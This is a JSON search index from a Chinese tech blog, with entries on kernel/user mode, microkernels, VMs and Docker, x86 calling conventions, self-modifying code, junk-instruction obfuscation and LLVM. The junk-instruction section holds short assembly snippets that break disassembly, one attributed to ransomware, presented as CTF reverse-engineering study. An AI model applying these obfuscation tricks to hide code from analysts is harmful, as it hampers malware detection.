[{"categories":["Binary"],"content":"开篇 最近在学MIT 6.S081 Operating System，受益匪浅。开篇文章记录一下对一些所思、所想，或是总结。预计长期缓慢更新。 ","date":"2023-01-29","objectID":"/2023/01/os/:1:0","tags":["os"],"title":"OS learning","uri":"/2023/01/os/"},{"categories":["Binary"],"content":"OS Organization ","date":"2023-01-29","objectID":"/2023/01/os/:2:0","tags":["os"],"title":"OS learning","uri":"/2023/01/os/"},{"categories":["Binary"],"content":"Why user/kernel mode？ 现今操作系统普遍拥有内核态与用户态两层，这么做在根本上是为了权限隔离。 操作系统的权限隔离依赖于硬件的权限隔离。如Intel CPU 把指令权限划分为ring0-ring3四个等级，操作系统内核跑在ring0，拥有最高权限。用户态跑在ring3，权限最低。 权限隔离来源于操作系统对用户程序的零信任。要想设计一个尽可能安全的操作系统，就必须假设用户程序是恶意的。用户程序想要进行一些涉及特权指令的敏感操作（操作进程、更改页表、使用文件系统等等）都必须经过内核把关，即通过syscall把控制权交给内核。内核确认操作合法后，运行特权指令，最后把控制权还给用户程序。如果内核认为操作非法，多半会直接终止程序运行。 权限隔离促成了进程间隔离。一个进程无法访问其他进程的内存空间，得益于页表机制。但也正因为权限隔离，致使一个进程无法访问或更改页表，从而给页表加了把锁。每个进程都认为自己独占整个物理内存，使得每个进程都运行在一个隔离的环境中，没有互相间的影响。 使用用户态、内核态两层设计也提高了整个系统的稳定性。当一个用户程序运行中出现异常或崩溃时，内核不受影响，可以继续维持整个机器的正常运转。但这也警示我们，内核本身必须要足够健壮，一旦内核出现panic，那就真是回天乏术了。 ","date":"2023-01-29","objectID":"/2023/01/os/:2:1","tags":["os"],"title":"OS learning","uri":"/2023/01/os/"},{"categories":["Binary"],"content":"宏内核？微内核？ 传统的操作系统都是基于宏内核的。所谓宏内核，首先给人的印象就是大。从代码量上看，宏内核的代码量达到微内核的几十倍不成问题。 宏内核意味着在内核中实现了丰富的功能，包括但不限于： 为了管理硬盘数据，内核需要实现一个文件系统。 为了合理分配使用内存，内核普遍采用页表机制实现虚拟地址到物理地址的映射。 为了处理硬件消息，统筹各种硬件运作，内核需要实现一整套中断机制。 为了实现多核CPU的并行运算，内核需要建立一个线程切换、管理系统。 为了保证多线程下数据的安全访问，内核还需要可靠的锁机制。 为了封装底层，给应用开发提供系统API，内核需要规划、设计各种系统调用。 这也会是这篇文章后续讨论的一些主题。 随着操作系统的不断发展，人们发现内核中被塞进的东西越来越多，越来越难以维护。终于有人不堪忍受，提出了微内核的概念。 微内核致力于尽可能地减小内核的体量。微内核内部主要做两件事： 实现一个基于服务（service）的进程、内存空间管理系统 实现高效的进程间通信（IPC） 至于宏内核中文件系统、页表机制等等，被从内核中剥离了出来，放在用户空间变成了插件，作为一个进程运行。这在实际上让代码模块化更好，更易于维护。并且由于内核十分精简，出bug、漏洞的可能性大大降低，使整个系统更加健壮。 当用户应用需要使用文件系统、页表机制等时，就相当于要和另一个进程通信，即IPC，所以IPC的效率决定了整个系统工作的效率。整个过程中内核仅参与调度、管理，而不执行实际的功能代码。 在一些嵌入式场景中，由于文件系统或其他插件根本用不到，微内核的精简就显示出了其优势，被广受欢迎。 但是，在如今主机/服务器领域，还是宏内核、以及一些披着微内核名字的混合内核的天下。原因有三： 性能问题。微内核由于在IPC过程中需要更频繁地进出内核，运行效率比宏内核更低。不过在著名的L4微内核中，通过设计的优化能将效率提升到非常接近原生linux内核的地步，未来微内核是否能更进一步也未可知。 插件问题。想要真正开发出一个微内核操作系统，最难的点不在于内核，而在于插件。那些被从宏内核中拿出来的东西必须全部重新设计、开发，这并不是一件简单的事。 应用生态问题。没有足够的成果表明微内核优于宏内核，并且由于上一点的原因，插件体系一直都不够完善，放弃主流的宏内核，为微内核开发应用是件费力不讨好的事。 ","date":"2023-01-29","objectID":"/2023/01/os/:2:2","tags":["os"],"title":"OS learning","uri":"/2023/01/os/"},{"categories":["Dev"],"content":"虚拟机(Virtual Machine) 从使用的角度讨论几个简单概念，不涉及具体的虚拟化技术 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:1:0","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#为什么会有虚拟机 使用现有硬件资源干更多的事 最常用，如在windows上装linux运行elf文件 获得隔离环境 运行不受信任的软件，如病毒 售卖云计算资源 阿里云/腾讯云/华为云等各种vps提供商 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:1:1","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#虚拟机基本架构 理论层面来看： 在一台普通的机器中，软件如何使用硬件资源进行运作？ 笼统地说，操作系统内核调动硬件资源，分配给用户程序使用 尝试在操作系统内核和硬件之间加一层 虚拟机监视器（VMM）负责在不同系统内核之间协调硬件资源，隔离环境，并监控其运行状态 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:1:2","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#两种虚拟机方案 type1：直接运行在硬件上 我们在上面的想法实际变成了type1虚拟机。VMM直接与硬件交互，协调、分配硬件资源。一般为虚拟机数量较多的企业环境使用 hyper-V：win10自带，开启后，windows主机就变成了第一个vm kvm：linux内核的一个模块。 优势： 灵活。可以在不同的物理资源之间移动，而不会影响用户 安全性高。不经过os层直接操作硬件，减少了vmm被攻击的可能 动态分配资源。vmm实际运行时只分配足够客户机使用的资源。vps超售 劣势： 功能有限。相比type2提供的功能较少 管理较难。 type2：运行于存在的os上 不直接接触硬件，受主机操作系统控制，作为一个用户程序运行在os上，个人使用较多。 vmware：虚拟机软件老大哥。功能丰富，使用者众多。但专业版收费 virtual-box：免费且做得很不错，某些功能不如vmware，但实测在linux上使用体验更好 优势： 便于管理。管理简单，适合个人使用 功能丰富。软件通常会提供丰富的工具，文件拖拽、剪贴板同步等等 劣势： 性能较低。性能不如type1，容易出现延迟 安全性较低。攻击者可能会利用操作系统的漏洞来访问虚拟机 无法动态分配资源。需要预分配资源，虚拟机开启状态下无法更改 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:1:3","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"Docker ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:0","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#容器技术简介 在很多虚拟化场景下，我们的目的其实只是要运行某个应用，如果使用虚拟机构建一整个操作系统未免太过浪费，且不利于打包与移植 容器技术可以按软件所需将系统资源划分到孤立的组中。 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:1","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#容器技术发展 chroot： 是unix系统的一个命令。作用于正在运行的进程和它的子进程，改变其根目录。被操作的应用程序无法访问根目录之外的内容，从而unix就有了这种能力：为每个进程提供一个隔离的文件系统。chroot被认为是容器技术的鼻祖。 namespace机制： linux内核用来隔离资源的方式。通过namespace可以让一个进程只看到与自己相关的一部分资源，是对全局资源的一种封装隔离。 Cgroups： 全称Control Groups，原名Process Containers，后被并入linux内核。用来限制、统计、隔离一组进程的资源使用。 LXC： 全称Linux Containers。使用namespace做资源隔离，解决能用什么资源的问题。使用Cgroups做资源控制，解决能用多少资源的问题。 k8s： 全称Kubernetes。是用于自动部署、扩展和管理“容器化（containerized）应用程序”的开源系统，它旨在提供“跨主机集群的自动部署、扩展以及运行应用程序容器的平台”。它支持一系列容器工具，包括Docker等 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:2","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#Docker简介 Docker是目前最受欢迎的容器技术。 轻量、便携、隔离、性能损耗小 Docker使用linux kernel的namespace做资源隔离（能用什么资源），使用Cgroups做资源控制（能用多少资源） windows和其它平台要使用docker，需要安装一个特殊改进的linux kernel（docker安装包自带）。 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:3","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#Docker三大基本概念 镜像（image）：一个只读的文件和文件夹组合，包含所有镜像启动所需的基础文件和配置信息。 容器（Container）：是镜像的运行实体，运行着真正的应用进程。与主机隔离，无法看到主机上的进程、环境变量、网络等信息。 仓库（Repository）：类似于代码仓库，用于存放docker镜像。Dockerhub是官方的公开镜像仓库，自己也可以构建自己的私有仓库。 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:4","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#Docker基本架构 docker采用CS架构，由docker守护进程（Docker daemon）作为server和Docker命令行工具作为client组成。 Dockerd：docker引擎，真正干活的程序 Docker client：接收用户输入的命令，与Dockerd通信 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:5","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#实例：拉取Docker镜像并启动容器 注：如果想要使用非root用户操作docker,可以创建docker用户组，具体方法请自行搜索 sudo systemctl start docker # 确保dockerd守护进程开启 docker pull nginx # 拉取nginx镜像 docker run -d -p 8080:80 nginx # 后台运行 指定端口映射 主机端口:容器内端口 镜像名 浏览器打开127.0.0.1:8080即可看到nginx页面 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:6","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#Dockerfile 由基础镜像，逐步构建自己的镜像。以下为一个最简单的Dockerfile例子: Dockerfile： # 指定基础镜像 FROM nginx # 替换nginx默认index.html的内容 RUN echo \"\u003ch1\u003eRX IS GOD!\u003c/h1\u003e\" \u003e /usr/share/nginx/html/index.html 使用Dockerfile构建镜像 docker build . -t mynginx:v1 # 构建镜像 当前目录 指定标签 name:tag 使用镜像创建并运行容器 docker run -d -p 8081:80 mynginx:v1 # 后台运行 指定端口映射 主机端口:容器内端口 镜像名:tag (不加tag会默认找mynginx:latest) ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:7","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Dev"],"content":"#Docker Compose 注：在大多数发行版中，docker compose需要单独安装 用于定义和运行多容器应用程序的工具。使用docker-compose.yml配置文件定义服务。部署多容器项目时，方便一条命令启动、停止、管理整个项目 例如一个前后端分离的web项目，可以分成前端、后端、数据库、缓存服务器等多个容器，统一管理 下面用一个单容器的例子简单介绍下docker compose的常用语法 docker-compose.yml(遵循yaml配置文件语法): # 指定docker-compose 版本 version: '3' # 开始定义services services: # 定义一个叫nginx的服务 nginx: # docker会去当前目录(.)下寻找Dockerfile构建镜像 build: . # 指定端口映射 ports: - \"8082:80\" 运行服务 docer-compose up -d # 后台运行 重新构建所用镜像 docker-compose build 查看log与停止、重启服务 docker-compose logs # 查看运行日志 docker-compose stop # 停止 docker-compose restart # 重启 ","date":"2023-01-28","objectID":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/:2:8","tags":["vm","docker"],"title":"虚拟机\u0026Docker","uri":"/2023/01/%E8%99%9A%E6%8B%9F%E6%9C%BAdocker/"},{"categories":["Binary"],"content":"函数调用 以下以x86汇编为例。 ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:1:0","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#栈 从两个角度去理解栈的概念： 数据结构：后进先出（last-in-first-out）的一种数据结构 二进制程序：程序中用来存储局部变量和返回地址的一块连续内存 在pwndbg(增强版gdb)中使用vmmap指令可以查看程序内存空间。可以看见有一段属于栈空间 pwndbg\u003e vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x555555554000 0x555555555000 r--p 1000 0 /home/dx3906/Documents/REV组会/1-15/function_call/main 0x555555555000 0x555555556000 r-xp 1000 1000 /home/dx3906/Documents/REV组会/1-15/function_call/main 0x555555556000 0x555555557000 r--p 1000 2000 /home/dx3906/Documents/REV组会/1-15/function_call/main 0x555555557000 0x555555558000 r--p 1000 2000 /home/dx3906/Documents/REV组会/1-15/function_call/main 0x555555558000 0x555555559000 rw-p 1000 3000 /home/dx3906/Documents/REV组会/1-15/function_call/main 0x7ffff7d95000 0x7ffff7d97000 rw-p 2000 0 [anon_7ffff7d95] 0x7ffff7d97000 0x7ffff7db9000 r--p 22000 0 /usr/lib/libc.so.6 0x7ffff7db9000 0x7ffff7f14000 r-xp 15b000 22000 /usr/lib/libc.so.6 0x7ffff7f14000 0x7ffff7f6b000 r--p 57000 17d000 /usr/lib/libc.so.6 0x7ffff7f6b000 0x7ffff7f6f000 r--p 4000 1d4000 /usr/lib/libc.so.6 0x7ffff7f6f000 0x7ffff7f71000 rw-p 2000 1d8000 /usr/lib/libc.so.6 0x7ffff7f71000 0x7ffff7f80000 rw-p f000 0 [anon_7ffff7f71] 0x7ffff7fc4000 0x7ffff7fc8000 r--p 4000 0 [vvar] 0x7ffff7fc8000 0x7ffff7fca000 r-xp 2000 0 [vdso] 0x7ffff7fca000 0x7ffff7fcb000 r--p 1000 0 /usr/lib/ld-linux-x86-64.so.2 0x7ffff7fcb000 0x7ffff7ff1000 r-xp 26000 1000 /usr/lib/ld-linux-x86-64.so.2 0x7ffff7ff1000 0x7ffff7ffb000 r--p a000 27000 /usr/lib/ld-linux-x86-64.so.2 0x7ffff7ffb000 0x7ffff7ffd000 r--p 2000 31000 /usr/lib/ld-linux-x86-64.so.2 0x7ffff7ffd000 0x7ffff7fff000 rw-p 2000 33000 /usr/lib/ld-linux-x86-64.so.2 0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack] 0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall] ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:1:1","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#寄存器 esp（extended stack pointer）：指向栈顶 ebp（extended base pointer）：指向栈底，栈基址 eip（extended instruction pointer）：指向下一条要执行的指令 ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:1:2","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#push \u0026 pop push var：将var入栈。先esp -= 4，然后向esp指向的地方写入xxx pop reg：将栈顶元素出栈存在reg中。从esp指向的地方取4字节值，放到reg中，然后esp += 4 ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:1:3","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#函数调用过程 调用函数： call sub_xxx ; push eip， eip = xxx 初始化栈： push ebp ; 保存调用函数栈基址 mov ebp, esp ; 开启空的新栈 sub esp, xxx ; 给局部变量预留空间 执行函数体： 函数返回值会保存在eax中 函数返回： leave ; mov esp, ebp ; pop ebp retn ; pop eip 调用者清理调用时栈上分配的参数（cdecl） add esp, xxx 以一个简单的C程序为例： #include \u003cstdio.h\u003e int add(int a, int b) { int sum; sum = a + b; return sum; } int main() { int a = 1, b = 2; int c = 3; printf(\"%d\", add(a, b) + c); return 0; } gcc编译：gcc -o main -m32 main.c 分析add函数调用过程栈和寄存器的变化： ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:1:4","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#调用约定 参考：X86调用约定 - 维基百科，自由的百科全书 微软就喜欢搞事情 X86： cdecl（C declaration）：C语言的事实上的标准。参数从右至左入栈，调用者清理栈上参数。 stdcall：Windows API的标准调用约定。参数从右往左入栈，被调用者清理栈上参数。 pascal：基于Pascal语言的调用约定。参数从左至右入栈，被调用者清理栈上参数。 X64： 与X86的区别主要是前6个参数使用寄存器传递。 微软x86-64调用约定：使用RCX, RDX, R8, R9四个寄存器用于存储函数调用时的4个参数(从左到右)，使用XMM0, XMM1, XMM2, XMM3来传递浮点变量。其他的参数直接入栈(从右至左)。整型返回值放置在RAX中，浮点返回值在XMM0中。 System V AMD64 ABI：主要在Solaris，GNU/Linux，FreeBSD和其他非微软OS上使用。头六个整型参数放在寄存器RDI, RSI, RDX, RCX, R8和R9上；同时XMM0到XMM7用来放置浮点变元. ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:1:5","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"SMC与花指令 ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:2:0","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#逆向与反逆向的博弈 逆向：一般是指从二进制文件倒推回源代码进行分析的过程 反逆向：开发人员为了避免软件被随意修改，想出了一系列方法，在不影响软件使用的前提下，提高软件的逆向分析难度 ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:2:1","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#两种基础的反逆向手段 SMC 花指令 ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:2:2","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#Self-Modifying Code 即代码自修改技术，简称SMC 当你直接用IDA打开查看源码时，被修改的部分会呈现出乱码的状态，程序在运行过程中会执行一段修改自身的代码，使得这部分代码变成正确的指令，从而正确执行 我们要做的就是通过分析程序未加密的部分，找到用来修改自身的那部分代码，然后手动进行修复并解密 特征：乱码，virtualprotect（PE）、mprotect（ELF），将函数作为地址进行运算 ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:2:3","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"#花指令 由设计者特别构思，希望使反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向 直接导致的结果就是，会使IDA的自动分析失败，产生大量未知数据 这时就需要我们来识破这些花指令，引导IDA正常地分析 举例： 垃圾字节：最常见 jz/jnz xxx+1 call xxxx ; 一般是不存在的地址 纯垃圾代码：ransomware pusha popa nop push eax pop eax push ebx pop ebx 扰乱堆栈平衡的垃圾代码：eflo pop rax add rax, 1 push rax mov rax, rsp xchg rax, [rax] pop rsp mov [rsp], rax retn ret实现隐式跳转： push rbx pushfq call $+5 pop rbx add rbx, 3Fh mov [rsp+8], rbx popfq retn 思路来源：NCTF2022的ccccha 如何制作：ret跳转的简单控制流混淆 - DX3906‘s blog 如何去除：NCTF2022 ccccha 花指令/混淆 详解 - DX3906’s blog ","date":"2023-01-15","objectID":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/:2:4","tags":["CTF","reverse"],"title":"函数调用、花指令与smc","uri":"/2023/01/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%8A%B1%E6%8C%87%E4%BB%A4smc/"},{"categories":["Binary"],"content":"LLVM的历史 LLVM的命名最早源于底层虚拟机（Low Level Virtual Machine）的首字母缩写。后来这个项目不断发展，使得这个名字变得不贴切，于是开发者决定放弃这个缩写的意义。如今LLVM已单纯成为一个品牌，适用于LLVM下的所有项目，包含LLVM中间代码（LLVM IR）、LLVM调试工具、LLVM C++标准库等 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:1:0","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"LLVM和编译器 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:2:0","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"常见编译器架构 常见编译器架构通常被分为三部分： 前端（Frontend）：词法分析、语法分析、语义分析、生成中间代码 中间端优化器（Optimizer）：优化中间代码（有时中间端被归为后端的一部分） 后端（Backend）：生成机器码 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:2:1","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"LLVM架构 不同的语言使用自己相应的编译前端生成统一的LLVM IR LLVM Optimizer对LLVM IR进行优化 使用对应平台的LLVM Backend生成相应的机器码 LLVM已经成为多个编译器和代码生成相关项目的子项目。 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:2:2","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"LLVM与前端 LLVM最初被用来取代gcc中的代码生成器，gcc的前端许多已经可以与其运行，LLVM目前支持Ada、C、C++、D语言、Fortran、Haskell、Julia、Objective-C、Rust及swift的编译。 LLVM引来一些人为许多语言设计新的编译器。其中比较出名的clang，主要由苹果电脑进行支持，其目的是取代gcc系统下的Objective-C编译器。 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:2:3","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"LLVM与中间端 LLVM的核心是中间代码（Intermediate Representation，IR），一种类似于汇编的底层语言。 LLVM IR有三种表示形式： 人类可读的形式 内存中的LLVM IR 二进制形式的bitcode ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:2:4","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"LLVM与后端 LLVM已支持多种指令集，可以生成多种平台的机器码。包括ARM、Qualcomm Hexagon、MIPS、Nvidia并行指令集（LLVM中称为NVPTX），PowerPC、AMD TeraScale、AMDGPU、SPARC、SystemZ、RISC-V、WebAssembly、x86、x86-64和XCore ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:2:5","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"LLVM作为后端的C语言编译流程 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:3:0","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"一图以蔽之 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:3:1","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"相关文件 main.c：C语言源代码 main.ll：LLVM IR的人类可读形式 main.bc：LLVM IR的bitcode形式。可以使用lli解释运行（Just In Time execute） main.s：特定平台下的汇编形式 main.o：可重定向目标文件 a.out：可执行文件 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:3:2","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"相关工具 clang：C语言编译前端，用来生成LLVM IR opt：llvm IR优化器，针对bitcode形式的IR llvm-as：llvm汇编器，将llvm IR人类可读形式转化为bitcode形式 llvm-dis：llvm-as的逆过程，将bitcode转化为人类可读的形式 llvm-link：llvm IR bitcode形式的链接器，将多个bitcode文件链接成一个bitcode文件 llc：llvm IR bitcode形式的编译器，将bitcode转化为汇编代码 lli：llvm IR bitcode形式的解释运行工具 ","date":"2023-01-11","objectID":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/:3:3","tags":["reverse","llvm"],"title":"LLVM基础概念总结","uri":"/2023/01/llvm%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%80%BB%E7%BB%93/"},{"categories":["Binary"],"content":"Ref LLVM - 维基百科，自由的百科全书 llvm编译的基本概念和流程 | 流水的账 深入浅出让你理解什么是LLVM - 简书 llvm-ir-tutorial/LLVM IR入门指南(1)——LLVM架构简介.md at master · Evian-Zhang/llvm-ir-tutorial · GitHub 